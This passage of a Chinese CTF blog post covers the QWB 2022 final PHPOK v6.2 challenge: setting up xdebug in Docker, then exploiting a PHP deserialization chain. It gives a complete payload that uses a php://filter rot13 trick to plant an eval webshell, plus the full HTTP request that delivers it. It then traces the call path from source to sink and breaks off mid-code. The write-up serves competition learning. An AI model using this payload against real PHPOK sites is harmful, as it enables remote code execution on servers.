@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="审审PHP  QWB FINAL - CMS (PHPOK v6.2)上次审计PHP还是在大二，换了电脑后也一直没有配置xdebug环境，导致当天只能硬着头皮看代码，看了一天后入口和出口都找到了，可惜没法debug不知道函数和参数的情况，加之对一些函数敏感度不够，错过了。今天就专门抽了一下午时间来配置环境和debug这个洞 环境配置环境配置有点折腾人，因为给了dockerfile，但m1pro有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NS - QWB 2022">
+<meta property="og:url" content="http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/index.html">
+<meta property="og:site_name" content="Trashbox 4 outx!">
+<meta property="og:description" content="审审PHP  QWB FINAL - CMS (PHPOK v6.2)上次审计PHP还是在大二，换了电脑后也一直没有配置xdebug环境，导致当天只能硬着头皮看代码，看了一天后入口和出口都找到了，可惜没法debug不知道函数和参数的情况，加之对一些函数敏感度不够，错过了。今天就专门抽了一下午时间来配置环境和debug这个洞 环境配置环境配置有点折腾人，因为给了dockerfile，但m1pro有">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20220822191901305.png">
+<meta property="article:published_time" content="2022-08-22T02:39:40.000Z">
+<meta property="article:modified_time" content="2022-08-22T11:24:26.357Z">
+<meta property="article:author" content="outx">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20220822191901305.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>NS - QWB 2022</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/paper/">Paper</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post " href="/2022/08/17/DFJK2022/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&text=NS - QWB 2022"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&title=NS - QWB 2022"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&is_video=false&description=NS - QWB 2022"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NS - QWB 2022&body=Check out this article: http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&title=NS - QWB 2022"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&title=NS - QWB 2022"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&title=NS - QWB 2022"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&title=NS - QWB 2022"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&name=NS - QWB 2022&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&t=NS - QWB 2022"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#QWB-FINAL-CMS-PHPOK-v6-2"><span class="toc-number">1.</span> <span class="toc-text">QWB FINAL - CMS (PHPOK v6.2)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">1.2.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Track-It"><span class="toc-number">1.3.</span> <span class="toc-text">Track It</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WMCTF-JAVA"><span class="toc-number">2.</span> <span class="toc-text">WMCTF - JAVA</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.</span> <span class="toc-text">思路</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        NS - QWB 2022
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">outx</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-08-22T02:39:40.000Z" itemprop="datePublished">2022-08-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Notes/">Notes</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link-link" href="/tags/Web/" rel="tag">Web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>审审PHP</p>
+</blockquote>
+<h1 id="QWB-FINAL-CMS-PHPOK-v6-2"><a href="#QWB-FINAL-CMS-PHPOK-v6-2" class="headerlink" title="QWB FINAL - CMS (PHPOK v6.2)"></a>QWB FINAL - CMS (PHPOK v6.2)</h1><p>上次审计PHP还是在大二，换了电脑后也一直没有配置xdebug环境，导致当天只能硬着头皮看代码，看了一天后入口和出口都找到了，可惜没法debug不知道函数和参数的情况，加之对一些函数敏感度不够，错过了。今天就专门抽了一下午时间来配置环境和debug这个洞</p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>环境配置有点折腾人，因为给了dockerfile，但m1pro有点搞，所以记录下踩的坑。</p>
+<p>首先，官方给的Dockerfile，在此基础上添加php7.2-xdebug进行安装</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:18.04</span><br><span class="line"></span><br><span class="line">ENV DEBIAN_FRONTEND noninteractive</span><br><span class="line"></span><br><span class="line">COPY sources.list /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install apache2 -y</span><br><span class="line">COPY apache2.conf /etc/apache2/apache2.conf</span><br><span class="line">COPY smity2.tar.gz /root/smity2.tar.gz</span><br><span class="line">COPY flag /flaaaaaaggggggggggg</span><br><span class="line">COPY study.sql /root/study.sql</span><br><span class="line"></span><br><span class="line">RUN apt-get update</span><br><span class="line">RUN apt-get install -y mariadb-server mariadb-client unzip software-properties-common php7.2 php7.2-xml php7.2-mysqli php7.2-xmlrpc php7.2-soap php7.2-intl php7.2-gd php7.2-zip php7.2-mbstring libapache2-mod-php php-xml php-xmlrpc php-soap php-intl php-gd php-zip php-mbstring unzip php7.2-xdebug vim</span><br><span class="line"></span><br><span class="line">RUN groupadd www \</span><br><span class="line">    &amp;&amp; useradd --shell /sbin/nologin -g www www \</span><br><span class="line">    &amp;&amp; rm -rf /var/www/html/* \</span><br><span class="line">    &amp;&amp; tar zxvf /root/smity2.tar.gz -C / \</span><br><span class="line">    &amp;&amp; chmod 755 -R /var/www/html \</span><br><span class="line">    &amp;&amp; chmod 777 -R /var/www/html/_* \</span><br><span class="line">    &amp;&amp; chmod 777 -R /var/www/html/task/ \</span><br><span class="line">    &amp;&amp; service mysql start \</span><br><span class="line">    &amp;&amp; mysql -uroot -proot -e &quot;create user phpok identified by &#x27;phpok&#x27;;&quot; \</span><br><span class="line">    &amp;&amp; mysql -uroot -proot -e &quot;create database phpok;use phpok;source /root/study.sql;&quot; \</span><br><span class="line">    &amp;&amp; mysql -uroot -proot -e &quot;grant all on phpok.* to phpok@&#x27;localhost&#x27; identified by &#x27;phpok&#x27; with grant option;&quot; \</span><br><span class="line">    &amp;&amp; mysql -uroot -proot -e &quot;flush privileges;&quot; \</span><br><span class="line">    &amp;&amp; rm -rf /var/lib/apt/lists/* \</span><br><span class="line">    &amp;&amp; chmod 644 /flaaaaaaggggggggggg \</span><br><span class="line">    &amp;&amp; a2enmod rewrite \</span><br><span class="line">    &amp;&amp; service apache2 restart</span><br><span class="line"></span><br><span class="line">ENTRYPOINT service apache2 restart &amp;&amp; service mysql restart &amp;&amp; sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>替换source.list为arm64用的，需要对应上ubuntu版本，这里是18.04特有，别的会报错（实测）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic main universe restricted</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic main universe restricted</span><br></pre></td></tr></table></figure>
+
+<p>然后配置docker-compose方便启动，需要注意环境的php.ini是要替换apache2目录的而非cli目录的，同时留意不需要映射9000</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">version: &#x27;3&#x27;</span><br><span class="line">services:</span><br><span class="line">  myimg:</span><br><span class="line">    image: myimg:0.1</span><br><span class="line">    build:</span><br><span class="line">      context: .</span><br><span class="line">      dockerfile: Dockerfile</span><br><span class="line">    ports:</span><br><span class="line">      - 8081:80</span><br><span class="line">      # - 9000:9000</span><br><span class="line">    volumes:</span><br><span class="line">      - ./var/www/html/:/var/www/html/</span><br><span class="line">      - ./php.ini:/etc/php/7.2/apache2/php.ini</span><br><span class="line">    stdin_open: true</span><br><span class="line">    tty: true</span><br></pre></td></tr></table></figure>
+
+<p>最后就是在php.ini中追加xdebug的参数，这里是在网上找的基础上改的，但是原版里面有一行用#注释的内容，在vscode里看起来一点毛病也没有，但是解析php.ini时会出错，但是对于apache2的重启没有任何影响（后续通过/var/log相关日志排查出来的），在这里踩了坑，需留意</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">zend_extension=&quot;/usr/lib/php/20170718/xdebug.so&quot;</span><br><span class="line">xdebug.remote_handler=&quot;dbgp&quot;</span><br><span class="line"></span><br><span class="line">xdebug.remote_host=&quot;192.168.xx.xx&quot;</span><br><span class="line">xdebug.remote_port=&quot;9000&quot;</span><br><span class="line">xdebug.remote_log=&quot;/var/log/php/xdebug.log&quot;</span><br><span class="line">xdebug.remote_enable=1</span><br><span class="line">xdebug.idekey=&quot;outx&quot;</span><br><span class="line"></span><br><span class="line">;启用代码自动跟踪</span><br><span class="line">xdebug.auto_trace = On</span><br><span class="line">;启用性能检测分析</span><br><span class="line">xdebug.profiler_enable = On</span><br><span class="line">xdebug.profiler_enable_trigger = On</span><br><span class="line">xdebug.profiler_output_name = &quot;profiler.out.%t.%p&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>根据周末硬看了一天的成果，pop链是现成的，利用framework/engine/cache.php中的cache类，留意析构方法和save方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()</span><br><span class="line">&#123;</span><br><span class="line">	//echo &quot;&lt;pre&gt;&quot;.print_r($this-&gt;key_list,true).&quot;&lt;/pre&gt;&quot;;</span><br><span class="line">	//echo &quot;&lt;pre&gt;&quot;.print_r(count($this-&gt;key_list),true).&quot;&lt;/pre&gt;&quot;;</span><br><span class="line">	$this-&gt;save($this-&gt;key_id,$this-&gt;key_list);</span><br><span class="line">	$this-&gt;expired();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function save($id,$content=&#x27;&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">	if(!$id || $content === &#x27;&#x27; || !$this-&gt;status)&#123;</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line">	$this-&gt;_time();</span><br><span class="line">	$content = serialize($content);</span><br><span class="line">	$file = $this-&gt;folder.$id.&quot;.php&quot;;</span><br><span class="line">	file_put_contents($file,&#x27;&lt;?php exit();?&gt;&#x27;.$content);</span><br><span class="line">	$this-&gt;_time();</span><br><span class="line">	$this-&gt;_count();</span><br><span class="line">	return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>当时为什么找到这个地方呢，就是从file_put_contents这个sink点搜过来的，然后确定了这个链是可以打反序列化的，这里可以用php://filter绕过这个exit</p>
+<p>构造class</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class cache </span><br><span class="line">&#123;</span><br><span class="line">  protected $timeout = 1800;</span><br><span class="line">	protected $status = true;</span><br><span class="line">	protected $prefix = &#x27;qinggan_&#x27;;</span><br><span class="line">	protected $keyfile = &#x27;&#x27;;</span><br><span class="line">	protected $folder = &#x27;php://filter/string.rot13/resource=/var/www/html/_cache/&#x27;;</span><br><span class="line">	protected $key_id = &#x27;outx&#x27;;</span><br><span class="line">	protected $key_list = &#x27;&lt;?cuc riny($_CBFG[\&#x27;bhgk\&#x27;]);?&gt;&#x27;;</span><br><span class="line">	protected $debug = false;</span><br><span class="line">	protected $time;</span><br><span class="line">	//</span><br><span class="line">	private $time_use = 0;</span><br><span class="line">	private $time_tmp = 0;</span><br><span class="line">	private $count = 0;</span><br><span class="line">&#125;</span><br><span class="line">echo(urlencode(urlencode(serialize(new cache())))); // 两次编码主要是为了第一次传递进去不影响后续解析</span><br><span class="line"></span><br><span class="line">O%253A5%253A%2522cache%2522%253A12%253A%257Bs%253A10%253A%2522%2500%252A%2500timeout%2522%253Bi%253A1800%253Bs%253A9%253A%2522%2500%252A%2500status%2522%253Bb%253A1%253Bs%253A9%253A%2522%2500%252A%2500prefix%2522%253Bs%253A8%253A%2522qinggan_%2522%253Bs%253A10%253A%2522%2500%252A%2500keyfile%2522%253Bs%253A0%253A%2522%2522%253Bs%253A9%253A%2522%2500%252A%2500folder%2522%253Bs%253A56%253A%2522php%253A%252F%252Ffilter%252Fstring.rot13%252Fresource%253D%252Fvar%252Fwww%252Fhtml%252F_cache%252F%2522%253Bs%253A9%253A%2522%2500%252A%2500key_id%2522%253Bs%253A4%253A%2522outx%2522%253Bs%253A11%253A%2522%2500%252A%2500key_list%2522%253Bs%253A29%253A%2522%253C%253Fcuc%2Briny%2528%2524_CBFG%255B%2527bhgk%2527%255D%2529%253B%253F%253E%2522%253Bs%253A8%253A%2522%2500%252A%2500debug%2522%253Bb%253A0%253Bs%253A7%253A%2522%2500%252A%2500time%2522%253BN%253Bs%253A15%253A%2522%2500cache%2500time_use%2522%253Bi%253A0%253Bs%253A15%253A%2522%2500cache%2500time_tmp%2522%253Bi%253A0%253Bs%253A12%253A%2522%2500cache%2500count%2522%253Bi%253A0%253B%257D</span><br></pre></td></tr></table></figure>
+
+<p>burp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api.php?c=call&amp;f=index&amp;data=&#123;%22m_picplayer%22:%220%26type_id%3Dformat_ext_all%26x%5Bform_type%5D%3Durl%26x%5Bcontent]=O%253A5%253A%2522cache%2522%253A12%253A%257Bs%253A10%253A%2522%2500%252A%2500timeout%2522%253Bi%253A1800%253Bs%253A9%253A%2522%2500%252A%2500status%2522%253Bb%253A1%253Bs%253A9%253A%2522%2500%252A%2500prefix%2522%253Bs%253A8%253A%2522qinggan_%2522%253Bs%253A10%253A%2522%2500%252A%2500keyfile%2522%253Bs%253A0%253A%2522%2522%253Bs%253A9%253A%2522%2500%252A%2500folder%2522%253Bs%253A56%253A%2522php%253A%252F%252Ffilter%252Fstring.rot13%252Fresource%253D%252Fvar%252Fwww%252Fhtml%252F_cache%252F%2522%253Bs%253A9%253A%2522%2500%252A%2500key_id%2522%253Bs%253A4%253A%2522outx%2522%253Bs%253A11%253A%2522%2500%252A%2500key_list%2522%253Bs%253A29%253A%2522%253C%253Fcuc%2Briny%2528%2524_CBFG%255B%2527bhgk%2527%255D%2529%253B%253F%253E%2522%253Bs%253A8%253A%2522%2500%252A%2500debug%2522%253Bb%253A0%253Bs%253A7%253A%2522%2500%252A%2500time%2522%253BN%253Bs%253A15%253A%2522%2500cache%2500time_use%2522%253Bi%253A0%253Bs%253A15%253A%2522%2500cache%2500time_tmp%2522%253Bi%253A0%253Bs%253A12%253A%2522%2500cache%2500count%2522%253Bi%253A0%253B%257D%22&#125; HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<h2 id="Track-It"><a href="#Track-It" class="headerlink" title="Track It"></a>Track It</h2><p>接下来就一步一步从source到sink点分析</p>
+<blockquote>
+<p>framework/api/call_control.php#index_f()，对应到URL则是api.php?c=call&amp;f=index，中间参数写到注释中了</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">public function index_f()</span><br><span class="line">&#123;</span><br><span class="line">	$data = $this-&gt;get(&#x27;data&#x27;,&#x27;html&#x27;);</span><br><span class="line">	...</span><br><span class="line">	if(substr($data,0,1) == &#x27;&#123;&#x27;)&#123;</span><br><span class="line">		$data = $this-&gt;lib(&#x27;json&#x27;)-&gt;decode(stripslashes($data)); //解析json，写成键值对</span><br><span class="line">		if($data)&#123;</span><br><span class="line">			$data = $this-&gt;format($data);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line">	//基于接口禁用SQL</span><br><span class="line">	$is_error = false;</span><br><span class="line">	foreach($data as $key=&gt;$value)&#123;</span><br><span class="line">		if(isset($value[&#x27;type_id&#x27;]))&#123; //$key = &quot;m_picplayer&quot; $value=&quot;0&amp;type_id=format_ext_all....&quot;</span><br><span class="line">			$is_error = true;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	if($is_error)&#123;</span><br><span class="line">		$this-&gt;error(P_Lang(&#x27;系统禁止改写类型参数&#x27;));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$call_all = $this-&gt;model(&#x27;call&#x27;)-&gt;all($this-&gt;site[&#x27;id&#x27;],&#x27;identifier&#x27;);</span><br><span class="line">	$is_ok = false;</span><br><span class="line">	$rslist = array();</span><br><span class="line">	foreach($data as $key=&gt;$value)&#123;</span><br><span class="line">		//检查系统是否有开放SQL调用</span><br><span class="line">		...</span><br><span class="line">		//明文传输将禁用sqlext和sqlinfo</span><br><span class="line">		if(isset($value[&#x27;sqlext&#x27;]))&#123;</span><br><span class="line">			unset($value[&#x27;sqlext&#x27;]);</span><br><span class="line">		&#125;</span><br><span class="line">		if(isset($value[&#x27;sqlinfo&#x27;]))&#123;</span><br><span class="line">			unset($value[&#x27;sqlinfo&#x27;]);</span><br><span class="line">		&#125;</span><br><span class="line">		if($call_all &amp;&amp; $call_all[$key] &amp;&amp; $call_all[$key][&#x27;is_api&#x27;])&#123; // $call_all[$key][&#x27;is_api&#x27;] = 1</span><br><span class="line">			$tmpValue = $value;</span><br><span class="line">			$fid = $key;</span><br><span class="line">			..</span><br><span class="line">			$rslist[$fid] = phpok($key,$tmpValue); // 关键点 -&gt; framework/phpok_tpl_helper.php</span><br><span class="line">			$is_ok = true;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			...</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>framework/phpok_tpl_helper.php#phpok($id=&#39;&#39;,$ext=&quot;&quot;)</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function phpok($id=&#x27;&#x27;,$ext=&quot;&quot;) // $ext=&quot;0&amp;type_id=format_ext_all....&quot; $id=&quot;m_picplayer&quot;</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	$count = func_num_args();</span><br><span class="line">	if($count&lt;=2)&#123;</span><br><span class="line">		return $GLOBALS[&#x27;app&#x27;]-&gt;call-&gt;phpok($id,$ext); // 关键 -&gt; framework/phpok_call.php</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>framework/phpok_call.php#phpok($id,$rs=&quot;&quot;)</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public function phpok($id,$rs=&quot;&quot;)</span><br><span class="line">	&#123;</span><br><span class="line">		...</span><br><span class="line">		//格式化参数</span><br><span class="line">		if($rs 